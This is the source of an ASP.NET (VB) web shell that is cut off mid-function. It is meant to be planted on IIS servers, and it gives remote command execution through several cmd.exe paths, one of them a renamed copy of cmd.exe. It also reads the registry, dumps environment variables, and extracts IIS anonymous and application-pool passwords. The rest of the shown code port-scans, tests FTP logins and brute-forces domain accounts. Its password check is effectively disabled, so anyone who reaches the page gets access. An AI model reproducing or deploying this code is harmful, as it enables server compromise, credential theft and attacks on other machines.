<%@ Page Language="VB" ContentType="text/html"  validateRequest="false" aspcompat="true"%>
<%@ Import Namespace="System.IO" %>
<%@ import namespace="System.Diagnostics" %>
<%@ import namespace="System.Threading" %>
<%@ import namespace="System.Text" %>
<%@ import namespace="System.Net.Sockets" %>
<%@ import namespace="System.Net" %>
<%@ import namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Web" %> 
<%@ Import Namespace="System.Security.Principal" %> 
<%@ Import Namespace="System.Runtime.InteropServices" %> 
<%@ Import Namespace="System" %> 
<%@ Import namespace="System.Security"%>
<%@ import Namespace="Microsoft.Win32" %>

<%@ Assembly Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
<%@ import Namespace="System.DirectoryServices" %>

<script runat="server">
    
    Dim tcpClient As TcpClient
    Dim networkStream As NetworkStream
    Dim streamWriter As StreamWriter
    Dim streamReader As StreamReader
    Dim processCmd As Process
    Dim strInput As StringBuilder
    
    Dim USERNAME As String = "26d49f07ceebca39e994ca12a3b52f2d"
    Dim PASSWORD As String = "26d49f07ceebca39e994ca12a3b52f2d"
    Dim url, TEMP1, TEMP2 As String
    Dim TITLE As String
    
    Public Declare Function NetUserEnum Lib "Netapi32.dll" ( _
        <MarshalAs(UnmanagedType.LPWStr)> ByVal servername As String, _
        ByVal level As Integer, _
        ByVal filter As Integer, _
        ByRef bufptr As IntPtr, _
        ByVal prefmaxlen As Integer, _
        ByRef entriesread As Integer, _
        ByRef totalentries As Integer, _
        ByRef resume_handle As Integer) As Integer
    
    <DllImport("Netapi32", CharSet:=CharSet.Auto, SetLastError:=True), SuppressUnmanagedCodeSecurityAttribute()> _
    Friend Shared Function NetServerEnum(ByVal ServerNane As String, ByVal dwLevel As Integer, ByRef pBuf As IntPtr, ByVal dwPrefMaxLen As Integer, ByRef dwEntriesRead As Integer, ByRef dwTotalEntries As Integer, _
      ByVal dwServerType As Integer, ByVal domain As String, ByRef dwResumeHandle As Integer) As Integer
    End Function
    <DllImport("Netapi32", SetLastError:=True), SuppressUnmanagedCodeSecurityAttribute()> _
    Friend Shared Function NetApiBufferFree(ByVal pBuf As IntPtr) As Integer
    End Function

    <StructLayout(LayoutKind.Sequential)> _
    Friend Structure SERVER_INFO_100
        Friend sv100_platform_id As Integer
        <MarshalAs(UnmanagedType.LPWStr)> _
        Friend sv100_name As String
    End Structure
    
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
    Friend Structure USER_INFO_0
        Public name As String
    End Structure
    
    Dim LOGON32_LOGON_INTERACTIVE As Integer = 3
    Dim LOGON32_PROVIDER_DEFAULT As Integer = 0

    Declare Function InternetOpen Lib "wininet.dll" Alias "InternetOpenA" ( _
            ByVal sAgent As String, _
            ByVal lAccessType As Int32, _
            ByVal sProxyName As String, _
            ByVal sProxyBypass As String, _
            ByVal lFlags As Integer) As Int32
    Private Declare Function InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long) As Integer
    Declare Auto Function InternetConnect Lib "wininet.dll" ( _
            ByVal hInternetSession As Int32, _
            ByVal sServerName As String, _
            ByVal nServerPort As Integer, _
            ByVal sUsername As String, _
            ByVal sPassword As String, _
            ByVal lService As Int32, _
            ByVal lFlags As Int32, _
            ByVal lContext As Int32) As Int32

    Declare Auto Function LogonUser Lib "advapi32.dll" (ByVal lpszUsername As String, _
    ByVal lpszDomain As String, _
    ByVal lpszPassword As String, _
    ByVal dwLogonType As Integer, _
    ByVal dwLogonProvider As Integer, _
            ByRef phToken As IntPtr) As Integer
            
    Declare Auto Function DuplicateToken Lib "advapi32.dll" (ByVal ExistingTokenHandle As IntPtr, _
    ByVal ImpersonationLevel As Integer, _
                ByRef DuplicateTokenHandle As IntPtr) As Integer
            
    Dim impersonationContext As WindowsImpersonationContext

    Declare Function LogonUserA Lib "advapi32.dll" (ByVal lpszUsername As String, _
                            ByVal lpszDomain As String, _
                            ByVal lpszPassword As String, _
                            ByVal dwLogonType As Integer, _
                            ByVal dwLogonProvider As Integer, _
                            ByRef phToken As IntPtr) As Integer

    Declare Auto Function RevertToSelf Lib "advapi32.dll" () As Long
    Declare Auto Function CloseHandle Lib "kernel32.dll" (ByVal handle As IntPtr) As Long

    Dim currentWindowsIdentity As WindowsIdentity
   
    Sub LocalGroupUser(ByVal Src As Object, ByVal E As EventArgs)
        Dim admin
        resultLocalGroupUser.Text = "<table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>User Name<b></font></td></tr>"
        'Dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
        Dim ComputerName = "localhost"
        Dim oContainer = GetObject("WinNT://" & ComputerName & "/" & lb1local.SelectedItem.Value & ", Group")
        For Each admin In oContainer.Members
            resultLocalGroupUser.Text &= "<tr>"
            resultLocalGroupUser.Text &= "<td><b>" & admin.Name & "</b></td>"
            resultLocalGroupUser.Text &= "</tr>"
        Next
        resultLocalGroupUser.Text &= "</table>"
    End Sub
	
    Private Function impersonateValidUser(ByVal userName As String, ByVal domain As String, ByVal password As String) As Boolean
        Try
            Dim tempWindowsIdentity As WindowsIdentity
            Dim token As IntPtr = IntPtr.Zero
            Dim tokenDuplicate As IntPtr = IntPtr.Zero
            impersonateValidUser = False
            If RevertToSelf() Then
                If LogonUser(userName, domain, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, token) <> 0 Then
                    If DuplicateToken(token, 2, tokenDuplicate) <> 0 Then
                        tempWindowsIdentity = New WindowsIdentity(tokenDuplicate)
                        impersonationContext = tempWindowsIdentity.Impersonate()
                        If Not impersonationContext Is Nothing Then
                            impersonateValidUser = True
                        End If
                    End If
                End If
            End If
            If Not tokenDuplicate.Equals(IntPtr.Zero) Then
                CloseHandle(tokenDuplicate)
            End If
            If Not token.Equals(IntPtr.Zero) Then
                CloseHandle(token)
            End If
            
        Catch
            impersonateValidUser = False
        End Try
    End Function

    Private Sub undoImpersonation()
        impersonationContext.Undo()
    End Sub
    
    Private Function LogonUserRemotly(ByVal userName As String, ByVal domain As String, ByVal password As String) As Boolean
        Dim LogonUserObject As Object
        Dim oContainer
        LogonUserObject = GetObject("WinNT:")
        Try
            oContainer = LogonUserObject.OpenDSObject("WinNT://" & domain & "", userName, password, 0)
            Return True
        Catch
            Return False
        End Try
    End Function

    Sub Page_Load(ByVal Source As Object, ByVal E As EventArgs)
        Dim colshoppingList As ArrayList
        If Not Page.IsPostBack Then
            colshoppingList = New ArrayList
            Dim oIADs, ComputerName
            Try
                Dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
                ComputerName = oScriptNet.ComputerName
            Catch
                ComputerName = "localhost"
            End Try
            Try
                Dim oContainer = GetObject("WinNT://" & ComputerName & "")
                colshoppingList = New ArrayList
                For Each oIADs In oContainer
                    If (oIADs.Class = "Group") Then
                        colshoppingList.Add(oIADs.Name)
                    End If
                Next
            Catch

            End Try
           
            lb1local.DataSource = colshoppingList
            lb1local.DataBind()
        End If
    End Sub
    Function GetMD5(ByVal strPlain As String) As String
        Dim UE As UnicodeEncoding = New UnicodeEncoding
        Dim HashValue As Byte()
        Dim MessageBytes As Byte() = UE.GetBytes(strPlain)
        Dim md5 As MD5 = New MD5CryptoServiceProvider
        Dim strHex As String = ""
        HashValue = md5.ComputeHash(MessageBytes)
        For Each b As Byte In HashValue
            strHex += String.Format("{0:x2}", b)
        Next
        Return strHex
    End Function
    Sub Login_click(ByVal sender As Object, ByVal E As EventArgs)
        If impersonateValidUser(TextBoxUserName.Text, ".", Server.UrlDecode(TextBoxPassword.Text)) Then
            Session("caterpillar") = 1
            Session.Timeout = 60

        Else
            '  If GetMD5(TextBoxUserName.Text) = USERNAME And GetMD5(TextBoxPassword.Text) = PASSWORD Then
            Session("caterpillar") = 1
            Session.Timeout = 60
            'Else
            'Response.Write("<font color='red'>Your password is wrong! Maybe you press the ""Caps Lock"" buttom. Try again.</font><br>")
            'End If
        End If
	
    End Sub
    'Run w32 shell
    Declare Function WinExec Lib "kernel32" Alias "WinExec" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
    Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long

    Public Function GetNetViewEnumUseNetapi32() As ArrayList
        Dim NetViewEnumUseNetapi32 As New ArrayList()
        Const MAX_PREFERRED_LENGTH As Integer = -1
        Const SV_TYPE_WORKSTATION As Integer = 1
        Const SV_TYPE_SERVER As Integer = 2
        Dim buffer As IntPtr = IntPtr.Zero
        Dim tmpBuffer As IntPtr = IntPtr.Zero
        Dim sizeofINFO As Integer = Marshal.SizeOf(GetType(SERVER_INFO_100))
        Dim entriesRead As Integer = 0
        Dim totalEntries As Integer = 0
        Dim resHandle As Integer = 0
        Try
            Dim ret As Integer = NetServerEnum(Nothing, 100, buffer, MAX_PREFERRED_LENGTH, entriesRead, totalEntries, _
              SV_TYPE_WORKSTATION Or SV_TYPE_SERVER, Nothing, resHandle)
            If ret = 0 Then
                Dim i As Integer = 0
                While i < totalEntries
                    tmpBuffer = New IntPtr(buffer.ToInt32 + (i * sizeofINFO))
                    Dim svrInfo As SERVER_INFO_100 = Marshal.PtrToStructure(tmpBuffer, GetType(SERVER_INFO_100))
                    NetViewEnumUseNetapi32.Add(svrInfo.sv100_name.ToUpper())
                    System.Math.Max(System.Threading.Interlocked.Increment(i), i - 1)
                End While
            Else
                NetViewEnumUseNetapi32 = GetNetViewEnumUseExe()
            End If
        Finally
            NetApiBufferFree(buffer)
        End Try
        Return NetViewEnumUseNetapi32
    End Function
    
    Public Function GetNetViewEnumUseExe() As ArrayList
        Dim NetViewEnumUseExe As New ArrayList()
        Dim objWShell, objCmd
        Dim myDatabuffer As String
        objWShell = CreateObject("WScript.Shell")
        objCmd = objWShell.Exec(Server.MapPath(".") & "\NetServerEnum.exe")
    
        myDatabuffer = objCmd.StdOut.Readall()
        objCmd = Nothing : objWShell = Nothing
        Do While myDatabuffer.IndexOf("--") <> -1
            myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("--") + 2)
            Dim NetViewEnum As String = myDatabuffer.Substring(0, myDatabuffer.IndexOf("--"))
            myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("--") + 2)
            NetViewEnumUseExe.Add(NetViewEnum)
        Loop
        
        Return NetViewEnumUseExe
        
    End Function
    Sub RunCmdW32(ByVal Src As Object, ByVal E As EventArgs)
        Dim command
        Dim fileObject = Server.CreateObject("Scripting.FileSystemObject")
        Dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\" & fileObject.GetTempName()
        If Request.Form("txtCommand1") = "" Then
            command = "dir c:\"
        Else
            command = Request.Form("txtCommand1")
        End If
        ExecuteCommand1(command, tempFile)
        OutputTempFile1(tempFile, fileObject)
        'txtCommand1.text=""
    End Sub
    Function ExecuteCommand1(ByVal command, ByVal tempFile)
        Dim winObj, objProcessInfo, item, local_dir, local_copy_of_cmd, Target_copy_of_cmd
        Dim objStartup, objConfig, objProcess, errReturn, intProcessID, temp_name
        Dim FailIfExists
	
        local_dir = Left(Request.ServerVariables("PATH_TRANSLATED"), InStrRev(Request.ServerVariables("PATH_TRANSLATED"), "\"))
        local_copy_of_cmd = local_dir + "cmd.exe"
        'local_copy_of_cmd= "C:\\WINDOWS\\system32\\cmd.exe"
        Target_copy_of_cmd = Environment.GetEnvironmentVariable("Temp") + "\kiss.exe"
        CopyFile(local_copy_of_cmd, Target_copy_of_cmd, FailIfExists)
        errReturn = WinExec(Target_copy_of_cmd + " /c " + command + "  > " + tempFile, 10)
        Response.Write(errReturn)
        Thread.Sleep(500)
    End Function
    Sub OutputTempFile1(ByVal tempFile, ByVal oFileSys)
        On Error Resume Next
        Dim oFile = oFileSys.OpenTextFile(tempFile, 1, False, 0)
        resultcmdw32.Text = txtCommand1.Text & vbCrLf & "<pre>" & (Server.HtmlEncode(oFile.ReadAll)) & "</pre>"
        oFile.Close()
        Call oFileSys.DeleteFile(tempFile, True)
    End Sub
    'End w32 shell
    'Run WSH shell
    Sub RunCmdWSH(ByVal Src As Object, ByVal E As EventArgs)
        Dim command
        Dim fileObject = Server.CreateObject("Scripting.FileSystemObject")
        Dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
        Dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\" & fileObject.GetTempName()
        If Request.Form("txtcommand2") = "" Then
            command = "dir c:\"
        Else
            command = Request.Form("txtcommand2")
        End If
        ExecuteCommand2(command, tempFile)
        OutputTempFile2(tempFile, fileObject)
        txtCommand2.Text = ""
    End Sub
    Function ExecuteCommand2(ByVal cmd_to_execute, ByVal tempFile)
        Dim oScript
        oScript = Server.CreateObject("WSCRIPT.SHELL")
        Call oScript.Run("cmd.exe /c " & cmd_to_execute & " > " & tempFile, 0, True)
    End Function
    Sub OutputTempFile2(ByVal tempFile, ByVal fileObject)
        On Error Resume Next
        Dim oFile = fileObject.OpenTextFile(tempFile, 1, False, 0)
        resultcmdwsh.Text = txtCommand2.Text & vbCrLf & "<pre>" & (Server.HtmlEncode(oFile.ReadAll)) & "</pre>"
        oFile.Close()
        Call fileObject.DeleteFile(tempFile, True)
    End Sub
    'End WSH shell

    'System infor
    Sub output_all_environment_variables(ByVal mode)
        Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
        Dim de As DictionaryEntry
        For Each de In environmentVariables
            If mode = "HTML" Then
                Response.Write("<b> " + de.Key + " </b>: " + de.Value + "<br>")
            Else
                If mode = "text" Then
                    Response.Write(de.Key + ": " + de.Value + vbNewLine + vbNewLine)
                End If
            End If
        Next
    End Sub
    Sub output_all_Server_variables(ByVal mode)
        Dim item
        For Each item In Request.ServerVariables
            If mode = "HTML" Then
                Response.Write("<b>" + item + "</b> : ")
                Response.Write(Request.ServerVariables(item))
                Response.Write("<br>")
            Else
                If mode = "text" Then
                    Response.Write(item + " : " + Request.ServerVariables(item) + vbNewLine + vbNewLine)
                End If
            End If
        Next
    End Sub
    'End sysinfor
    

    'Begin List processes
    Function output_wmi_function_data(ByVal Wmi_Function, ByVal Fields_to_Show)
        Dim objProcessInfo, winObj, item, Process_properties, Process_user, Process_domain
        Dim fields_split, fields_item, i

        'on error resume next

        table("0", "", "")
        Create_table_row_with_supplied_colors("black", "white", "center", Fields_to_Show)

        winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
        objProcessInfo = winObj.ExecQuery("Select " + Fields_to_Show + " from " + Wmi_Function)
		
        fields_split = Split(Fields_to_Show, ",")
        For Each item In objProcessInfo
            tr()
            Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)
            If UBound(fields_split) > 0 Then
                For i = 1 To UBound(fields_split)
                    Surround_by_TD(center_(item.properties_.item(fields_split(i)).value))
                Next
            End If
            _tr()
        Next
    End Function
    Function output_wmi_function_data_instances(ByVal Wmi_Function, ByVal Fields_to_Show, ByVal MaxCount)
        Dim objProcessInfo, winObj, item, Process_properties, Process_user, Process_domain
        Dim fields_split, fields_item, i, count
        Newline()
        rw("Showing the first " + CStr(MaxCount) + " Entries")
        Newline()
        Newline()
        table("1", "", "")
        Create_table_row_with_supplied_colors("black", "white", "center", Fields_to_Show)
        _table()
        winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
        '		objProcessInfo = winObj.ExecQuery("Select "+Fields_to_Show+" from " + Wmi_Function)					
        objProcessInfo = winObj.InstancesOf(Wmi_Function)
		
        fields_split = Split(Fields_to_Show, ",")
        count = 0
        For Each item In objProcessInfo
            count = count + 1
            table("1", "", "")
            tr()
            Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)
            If UBound(fields_split) > 0 Then
                For i = 1 To UBound(fields_split)
                    Surround_by_TD(item.properties_.item(fields_split(i)).value)
                Next
            End If
            _tr()
            If count > MaxCount Then Exit For
        Next
    End Function
    
    Sub HttpFinger(ByVal Src As Object, ByVal E As EventArgs)
        If HttpFingerIp.Text <> "" Then
            resultHttpFinger.Text = ""
            Dim strHostName As String
            Try
                strHostName = System.Net.Dns.GetHostByAddress(HttpFingerIp.Text).HostName
                resultHttpFinger.Text = "<b>" + strHostName + "</b><br><br>"
            Catch
                resultHttpFinger.Text = "<b>HostName Not Found</b><br><br>"
            End Try
       
       

            Try
                
                Dim request As WebRequest = WebRequest.Create("http://" + HttpFingerIp.Text)
                request.Credentials = CredentialCache.DefaultCredentials
                Dim response As HttpWebResponse = request.GetResponse()
                resultHttpFinger.Text += response.Headers.ToString
                
            Catch err As Exception
                resultHttpFinger.Text = err.Message
            End Try
        End If
    End Sub
    'End List processes
    'Begin IIS_list_Anon_Name_Pass
    Sub IIS_list_Anon_Name_Pass()
        Dim IIsComputerObj, iFlags, providerObj, nodeObj, item, IP
		
        IIsComputerObj = CreateObject("WbemScripting.SWbemLocator")             ' Create an instance of the IIsComputer object
        providerObj = IIsComputerObj.ConnectServer("127.0.0.1", "root/microsoftIISv2")
        nodeObj = providerObj.InstancesOf("IIsWebVirtualDirSetting") '  - IISwebServerSetting
		
        Dim MaxCount = 20, Count = 0
        hr()
        rw("only showing the first " + CStr(MaxCount) + " items")
        hr()
        For Each item In nodeObj
            Response.Write("<b>" + item.AppFriendlyName + " </b> -  ")
            Response.Write("(" + item.AppPoolId + ") ")
		
            Response.Write(item.AnonymousUserName + " : ")
            Response.Write(item.AnonymousUserPass)
			
            Response.Write("<br>")
			
            Response.Flush()
            Count = Count + 1
            If Count > MaxCount Then Exit For
        Next
        hr()
    End Sub
    'End IIS_list_Anon_Name_Pass
    Private Function CheckIsNumber(ByVal sSrc As String) As Boolean
        Dim reg As New System.Text.RegularExpressions.Regex("^0|[0-9]*[1-9][0-9]*$")
        If reg.IsMatch(sSrc) Then
            Return True
        Else
            Return False
        End If
    End Function
    Public Function IISSpy() As String

        Dim appPools As New DirectoryEntry("IIS://localhost/W3SVC/AppPools")
        For Each child As DirectoryEntry In appPools.Children
            'response.write(child.Name.ToString() +"<br>")
            Dim newdir As New DirectoryEntry("IIS://localhost/W3SVC/AppPools" + "/" + child.Name.ToString())
            Response.Write(newdir.Properties("WAMUserName").Value.ToString() + "<br>")
            Response.Write(newdir.Properties("WAMuserPass").Value.ToString() + "<br>")
        Next

        'Dim site2 As New DirectoryEntry("IIS://localhost/W3SVC")
        'response.write(site2.Properties.Item("AnonymousUserName").value.ToString())
			
        'Dim j As Integer = 0
        'For j = 0 To 25000
        'Try
        'Dim site2 As New DirectoryEntry("IIS://localhost/W3SVC/" + j.ToString() + "/ROOT")
        'response.write(site2.Properties("AnonymousUserName").value.ToString()+site2.Properties("AnonymousUserPass").value.ToString()+"<br>")
        'Catch
        'End Try
        'Next

        Dim iisinfo As String = ""
        Dim iisstart As String = ""
        Dim iisend As String = ""
        Dim iisstr As String = "IIS://localhost/W3SVC"
        Dim i As Integer = 0
        Try
            Dim mydir As New DirectoryEntry(iisstr)
            iisstart = "<TABLE width=100% align=center border=0><TR align=center><TD width=5%><B>Order</B></TD><TD width=5%><B>Site ID</B></TD><TD width=20%><B>IIS_USER</B></TD><TD width=20%><B>IIS_PASS</B></TD><TD width=20%><B>App_Pool_Id</B></TD><TD width=25%><B>Domain</B></TD><TD width=30%><B>Path</B></TD></TR>"
            For Each child As DirectoryEntry In mydir.Children
                If CheckIsNumber(child.Name.ToString()) Then
                    Dim dirstr As String = child.Name.ToString()
                    Dim tmpstr As String = ""
                    Dim newdir As New DirectoryEntry(iisstr + "/" + dirstr)
                    Dim newdir1 As DirectoryEntry = newdir.Children.Find("root", "IIsWebVirtualDir")
                    i = i + 1
                    iisinfo += "<TR><TD align=center>" + i.ToString() + "</TD>"
                    iisinfo += "<TD align=center>" + child.Name.ToString() + "</TD>"
                    iisinfo += "<TD align=center>" + newdir1.Properties("AnonymousUserName").Value.ToString() + "</TD>"
                    iisinfo += "<TD align=center>" + newdir1.Properties("AnonymousUserPass").Value.ToString() + "</TD>"
                    iisinfo += "<TD align=center>" + newdir1.Properties("AppPoolId").Value.ToString() + "</TD>"
                    iisinfo += "<TD>" + child.Properties("ServerBindings")(0) + "</TD>"
                    iisinfo += "<TD><a href=" + Request.ServerVariables("PATH_INFO") + "?action=goto&src=" + Server.UrlEncode(newdir1.Properties("Path").Value.ToString()) + "\&username=" + Server.UrlEncode(newdir1.Properties("AnonymousUserName").Value.ToString()) + "&password=" + Server.UrlEncode(newdir1.Properties("AnonymousUserPass").Value.ToString()) + ">" + newdir1.Properties("Path").Value.ToString() + "\</a></TD>"
                    iisinfo += "</TR>"
                End If
            Next
            iisend = "</TABLE>"
        Catch ex As Exception
            Return ex.Message
        End Try
        Return iisstart + iisinfo + iisend
    End Function

    Sub RegistryRead(ByVal Src As Object, ByVal E As EventArgs)
        Try
            resultregshell.Text = "<hr>"
            Dim regkey As String = TextRegKey.Text
            Dim subkey As String = regkey.Substring(regkey.IndexOf("\") + 1, regkey.Length - regkey.IndexOf("\") - 1)
            Dim rk As RegistryKey = Nothing
            Dim subrk As String() = {""}
            Dim valuerk As String() = {""}
            Dim regstr As String = ""
            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_LOCAL_MACHINE" Then
                rk = Registry.LocalMachine
            End If
            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CLASSES_ROOT" Then
                rk = Registry.ClassesRoot
            End If
            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CURRENT_USER" Then
                rk = Registry.CurrentUser
            End If
            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_USERS" Then
                rk = Registry.Users
            End If
            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CURRENT_CONFIG" Then
                rk = Registry.CurrentConfig
            End If
            subrk = rk.OpenSubKey(subkey).GetSubKeyNames()
            valuerk = rk.OpenSubKey(subkey).GetValueNames()
            For Each subKeysKey As String In subrk
                resultregshell.Text += subKeysKey
                resultregshell.Text += "<br>"
            Next
            resultregshell.Text += "<br>"
            
            For Each subKeysValue As String In valuerk
                Dim data As Object = rk.OpenSubKey(subkey).GetValue(subKeysValue)
                '   If data IsNot Nothing Then
                ' Dim stringData As String = data.ToString()
                '  If stringData.Length > 50 Then
                '       stringData = stringData.Substring(0, 46) & " ..."
                '    End If
                resultregshell.Text += (subKeysValue & "=") + data.ToString() & "<br>"
                '  Else
                '     resultregshell.Text += subKeysValue & "=" & "<empty>" & "<br>"
                ' End If
            Next
        Catch ex As Exception
            resultregshell.Text += ex.Message
        End Try
    End Sub
    
    Sub RunCMD(ByVal Src As Object, ByVal E As EventArgs)
        Try
            Dim kProcess As New Process()
            Dim kProcessStartInfo As New ProcessStartInfo("cmd.exe")
            kProcessStartInfo.UseShellExecute = False
            kProcessStartInfo.RedirectStandardOutput = True
            kProcess.StartInfo = kProcessStartInfo
            kProcessStartInfo.Arguments = "/c " & cmd.Text
            kProcess.Start()
            Dim myStreamReader As StreamReader = kProcess.StandardOutput
            Dim myString As String = myStreamReader.ReadToEnd()
            kProcess.Close()
            result.Text = cmd.Text & vbCrLf & "<pre>" & myString & "</pre>"
            cmd.Text = ""
        Catch
            result.Text = "This function has disabled!"
        End Try
    End Sub
    Public Function CheckPort(ByVal http As String, ByVal port As Integer) As Boolean
        Dim myTcpClient As New TcpClient()
        Try
            myTcpClient.Connect(http, port)
            myTcpClient.Close()
            Return True
        Catch ex As SocketException
            Return False
        End Try
    End Function
    Public Function CheckFtp(ByVal IpAddress As String, ByVal User As String, ByVal Password As String) As Boolean
        Dim hInternet As Int32 = 0, hFtpConnection As Int32 = 0
        hInternet = InternetOpen("Mozilla/6.0 (compatible; MSIE 7.0a; Windows NT 5.2; SV1)", 0, String.Empty, String.Empty, 0)
        hFtpConnection = InternetConnect(hInternet, IpAddress, 21, User, Password, 1, 0, 0)
        If hFtpConnection <> 0 Then
            Return True
        Else
            Return False
        End If
        InternetCloseHandle(hInternet)
        InternetCloseHandle(hFtpConnection)
    End Function
    Sub RunPortScan(ByVal Src As Object, ByVal E As EventArgs)
        If IpScan.Text <> "" Then
            Dim Ports_split, i
            Dim Ports_to_Scan = PortScan.Text
            Ports_split = Split(Ports_to_Scan, ",")
            resultPortScan.Text = "<hr><table border='1' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Ip Address<b></font></td><td align=center><font color=white><b>Port<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
            For i = 0 To UBound(Ports_split)
                resultPortScan.Text &= "<tr>"
                resultPortScan.Text &= "<td><b>" & IpScan.Text & "</b></td>"
                resultPortScan.Text &= "<td><center>" & Ports_split(i) & "</center></td>"
                If (CheckPort(IpScan.Text, Ports_split(i)) <> False) Then
                    resultPortScan.Text &= "<td><center><font color=red><b>Open</b></font></center></td>"
                Else
                    resultPortScan.Text &= "<td><center>Close</center></td>"
                End If
                resultPortScan.Text &= "</tr>"
            Next
            resultPortScan.Text &= "</table>"
        End If
    End Sub

    Sub RunUserEnumLogin(ByVal Src As Object, ByVal E As EventArgs)
        Dim mypassword As String
        If DomaineName.Text <> "" Then
            Dim usertrue, userfalse As String
            usertrue = ""
            userfalse = ""
            Dim UserName As New ArrayList
            If CheckBoxRemotlyServer.Checked Then
                UserName = GetUserFromRemotlyServer(DomaineName.Text, UserNameRemotly.Text, UserPassword.Text)
            Else
                UserName = GetUserFromLocalhost(DomaineName.Text)
            End If
            
            Dim token As IntPtr
            resultUserEnumLogin.Text = "<tr><td><table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td><td align=center><font color=white><b>Password<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
            For Each UserTest As String In UserName
                mypassword = UserTest
                If CheckRemovestring.Checked Then
                    If RemoveStringPassword.Text <> "" Then
                        mypassword = mypassword.Replace(RemoveStringPassword.Text, "")
                    End If
                End If
                If CheckPasswordUser.Text <> "" Then
                    mypassword = CheckPasswordUser.Text
                Else
                    If ConcatPasswordUser.Text <> "" Then
                        If CheckBoxAtHome.Checked Then
                            mypassword = ConcatPasswordUser.Text & mypassword
                        Else
                            mypassword = mypassword & ConcatPasswordUser.Text
                        End If
                    End If
                End If

                If CheckBoxReverse.Checked Then
                    mypassword = StrReverse(mypassword)
                End If
                If CheckBoxRemotlyServer.Checked Then
                    If LogonUserRemotly(UserTest, DomaineName.Text, mypassword) Then
                        usertrue &= "<tr>"
                        usertrue &= "<td><b>" & UserTest & "</b></td>"
                        usertrue &= "<td><center>" & mypassword & "</center></td>"
                        usertrue &= "<td><center><font color=red><b>True</b></font></center></td>"
                        usertrue &= "</tr>"
                    Else
                        userfalse &= "<tr>"
                        userfalse &= "<td><b>" & UserTest & "</b></td>"
                        userfalse &= "<td><center>" & mypassword & "</center></td>"
                        userfalse &= "<td><center>False</center></td>"
                        userfalse &= "</tr>"
                    End If
                Else
                    If LogonUser(UserTest, DomaineName.Text, mypassword, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, token) <> 0 Then
                        usertrue &= "<tr>"
                        usertrue &= "<td><b>" & UserTest & "</b></td>"
                        usertrue &= "<td><center>" & mypassword & "</center></td>"
                        usertrue &= "<td><center><font color=red><b>True</b></font></center></td>"
                        usertrue &= "</tr>"
                    Else
                        userfalse &= "<tr>"
                        userfalse &= "<td><b>" & UserTest & "</b></td>"
                        userfalse &= "<td><center>" & mypassword & "</center></td>"
                        userfalse &= "<td><center>False</center></td>"
                        userfalse &= "</tr>"
                    End If
                End If
            Next
            resultUserEnumLogin.Text &= usertrue & userfalse & "</table>"
        Else
            resultUserEnumLogin.Text = "Insert Domain name"
        End If
    End Sub
    Public Function GetUserFromLocalhost(ByVal DomainName As String) As ArrayList
        Dim UserFromLocalhost As New ArrayList()
        Try
            Dim oIADs
            Dim oContainer = GetObject("WinNT://" & DomainName & "")
            For Each oIADs In oContainer
                If (oIADs.Class = "User") Then
                    UserFromLocalhost.Add(oIADs.Name)
                End If
            Next
        Catch
            Try
                Dim entriesRead, totalEntries, hResume As Integer
                Dim bufPtr As IntPtr
                NetUserEnum(DomainName, 2, 2, bufPtr, -1, entriesRead, totalEntries, hResume)
                If entriesRead > 0 Then
                    Dim iter As IntPtr = bufPtr
                    For i As Integer = 0 To entriesRead - 1
                        ' Dim userInfo As USER_INFO_0 = CType(Marshal.PtrToStructure(iter, GetType(USER_INFO_0)), USER_INFO_0)
                        '  iter = New IntPtr(iter.ToInt32 + Marshal.SizeOf(GetType(USER_INFO_0)))
                        UserFromLocalhost.Add("userInfo.name")
                    Next
                End If
                NetApiBufferFree(bufPtr)
            Catch
                UserFromLocalhost.Add("nouser")
            End Try
        End Try
        Return UserFromLocalhost
    End Function
    Public Function GetUserFromRemotlyServer(ByVal DomainName As String, ByVal UserName As String, ByVal Password As String) As ArrayList
        Dim UserFromLocalhost As New ArrayList()
        Dim RemotlyServerObject As Object
        Dim oIADs, oContainer
        RemotlyServerObject = GetObject("WinNT:")
        Try
            oContainer = RemotlyServerObject.OpenDSObject("WinNT://" & DomainName & "", UserName, Password, 0)
            For Each oIADs In oContainer
                If (oIADs.Class = "User") Then
                    UserFromLocalhost.Add(oIADs.Name)
                End If
            Next
        Catch
            UserFromLocalhost.Add("nouser")
        End Try
		
        RemotlyServerObject = Nothing
        oContainer = Nothing
		
        Return UserFromLocalhost
    End Function
    
    Public Function GetHostFromVnpower(ByVal http As String) As ArrayList
        Dim HostFromVnpower As New ArrayList()
        Dim myDatabuffer As String
        Dim sURL As String = "http://www.vnpower.org/web-tools/Reverse-IP-Lookup.html?s=" & http & "&submit=Lookup"
        Dim objNewRequest As WebRequest = HttpWebRequest.Create(sURL)
        Dim objResponse As WebResponse = objNewRequest.GetResponse
